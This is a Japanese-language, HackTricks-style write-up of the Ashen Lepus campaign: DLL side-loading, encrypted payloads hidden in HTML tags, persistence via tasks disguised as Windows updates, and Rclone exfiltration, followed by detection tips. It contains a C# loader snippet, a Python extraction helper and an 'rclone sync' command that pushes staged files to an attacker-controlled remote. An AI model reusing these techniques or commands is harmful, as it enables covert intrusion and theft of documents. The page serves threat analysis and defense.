# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## トレードクラフトの概要

Ashen Lepus (aka WIRTE) は、DLL sideloading、staged HTML payloads、モジュール式 .NET backdoors を連鎖させて、中東の外交ネットワーク内に持続的に潜伏する再現可能なパターンを武器化しました。この手法は以下に依存しているため、どのオペレータでも再利用可能です:

- **Archive-based social engineering**: 無害に見える PDF がターゲットにファイル共有サイトから RAR アーカイブを取得するよう指示します。アーカイブには、見た目は正規の document viewer EXE、信頼されたライブラリ名を冠した悪性の DLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、およびデコイの `Document.pdf` が同梱されます。
- **DLL search order abuse**: 被害者が EXE をダブルクリックすると、Windows はカレントディレクトリから DLL インポートを解決し、malicious loader (AshenLoader) が信頼されたプロセス内で実行される一方、デコイの PDF が開いて疑いを避けます。
- **Living-off-the-land staging**: 以降のすべてのステージ（AshenStager → AshenOrchestrator → modules）は、必要になるまでディスク上に置かれず、無害に見える HTML レスポンス内に隠された暗号化されたブロブとして配信されます。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE は AshenLoader を side-load し、ホストのリコンを行い、それを AES-CTR で暗号化して、`token=`, `id=`, `q=`, または `auth=` のような回転するパラメータ内に POST します（例: `/api/v2/account` のような API 風パス）。
2. **HTML extraction**: C2 はクライアントの IP がターゲット地域にジオロケートされ、`User-Agent` がインプラントと一致した場合にのみ次ステージを明かし、sandboxes を撹乱します。チェックが通ると HTTP ボディに `<headerp>...</headerp>` ブロブが含まれ、そこに Base64/AES-CTR 暗号化された AshenStager ペイロードが入っています。
3. **Second sideload**: AshenStager は別の正規バイナリとともに展開され、そのバイナリが `wtsapi32.dll` をインポートします。バイナリに注入された悪性コピーはさらに HTML を取得し、今回は `<article>...</article>` を切り出して AshenOrchestrator を復元します。
4. **AshenOrchestrator**: Base64 エンコードされた JSON config をデコードするモジュラーな .NET コントローラ。config の `tg` と `au` フィールドは連結/ハッシュ化されて AES キーを生成し、それで `xrk` を復号します。得られたバイト列は、その後に取得される各モジュールブロブの XOR キーとして機能します。
5. **Module delivery**: 各モジュールは HTML コメントで記述され、パーサを任意のタグへリダイレクトして、単に `<headerp>` や `<article>` のみを探す静的ルールを破ります。モジュールには persistence (`PR*`)、uninstallers (`UN*`)、reconnaissance (`SN`)、screen capture (`SCT`)、file exploration (`FE`) などが含まれます。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
たとえ防御側が特定の要素をブロックまたは除去しても、オペレーターはHTMLコメントで示されたタグを変更するだけで配信を再開できる。

### クイック抽出ヘルパー (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML ステージング回避の類似点

最近の HTML smuggling に関する研究（Talos）は、HTML 添付ファイル内の `<script>` ブロックに Base64 文字列として隠されたペイロードがあり、実行時に JavaScript によってデコードされることを強調している。同じトリックは C2 応答にも再利用できる: スクリプトタグ（または他の DOM 要素）内に暗号化されたブロブをステージングし、AES/XOR の前にインメモリでデコードすることで、ページを通常の HTML に見せかける。

## 暗号化と C2 の強化

- **AES-CTR everywhere**: 現在の loaders は 256-bit キーと nonce（例 `{9a 20 51 98 ...}`）を埋め込み、暗号化/復号の前後に `msasn1.dll` のような文字列を使った XOR レイヤーを任意で追加する。
- **Infrastructure split + subdomain camouflage**: staging servers はツールごとに分離され、異なる ASNs にまたがってホスティングされ、正規に見えるサブドメインでフロントされることがあり、あるステージが失われても残りがさらされないようにしている。
- **Recon smuggling**: 列挙されたデータには高価値アプリを把握するために Program Files の一覧が含まれ、ホストから出る前に常に暗号化される。
- **URI churn**: クエリパラメータや REST パスがキャンペーンごとに変化し（例 `/api/v1/account?token=` → `/api/v2/account?auth=`）、脆弱な検知を無効化する。
- **Gated delivery**: サーバーはジオフェンシングされ、本物の implants にのみ応答する。承認されていないクライアントには無害に見える HTML を返す。

## 永続化と実行ループ

AshenStager は Windows のメンテナンスジョブに見せかけたスケジュールタスクを作成し、`svchost.exe` を介して実行される。例：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらのタスクは起動時や定期的に sideloading チェーンを再起動し、AshenOrchestrator がディスクに再度触れずに新しいモジュールを要求できるようにする。

## 無害な同期クライアントを使った Exfiltration

オペレーターは専用モジュールを使って外交文書を `C:\Users\Public`（world-readable で目立たない）にステージし、そのディレクトリを攻撃者管理のストレージと同期するために正規の [Rclone](https://rclone.org/) バイナリをダウンロードする。Unit42 は、今回のアクターが exfiltration に Rclone を使用するのを観測したのは初めてであり、正規の同期ツールを悪用して通常トラフィックに紛れるという広い傾向と一致すると指摘している：

1. **Stage**: ターゲットのファイルを `C:\Users\Public\{campaign}\` にコピー／収集する。
2. **Configure**: 攻撃者管理の HTTPS エンドポイント（例 `api.technology-system[.]com`）を指す Rclone の設定を配布する。
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行して、トラフィックを通常のクラウドバックアップのように見せる。

Rclone は正規のバックアップワークフローで広く使われているため、防御側は異常な実行（新しいバイナリ、怪しいリモート設定、または `C:\Users\Public` の急な同期など）に注目する必要がある。

## 検知の着眼点

- ユーザー書き込み可能なパスから予期せず DLL をロードする **signed processes** にアラートを出す（Procmon フィルタ + `Get-ProcessMitigation -Module`）、特に DLL 名が `netutils`, `srvcli`, `dwampi`, `wtsapi32` と重なる場合。
- 不審な HTTPS 応答を調査し、**異常なタグ内に埋め込まれた大きな Base64 ブロブ** や `<!-- TAG: <xyz> -->` コメントで保護されたものがないか確認する。
- HTML のハンティングを拡張し、AES/XOR 処理の前に JavaScript によってデコードされる **`<script>` ブロック内の Base64 文字列**（HTML smuggling スタイルのステージング）を探す。
- `svchost.exe` をサービス以外の引数で実行する、または dropper ディレクトリを指す **scheduled tasks** を探す。
- IT 管理下以外の場所に出現する **Rclone** バイナリ、新しい `rclone.conf` ファイル、または `C:\Users\Public` のようなステージングディレクトリからデータを引き出す同期ジョブを監視する。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
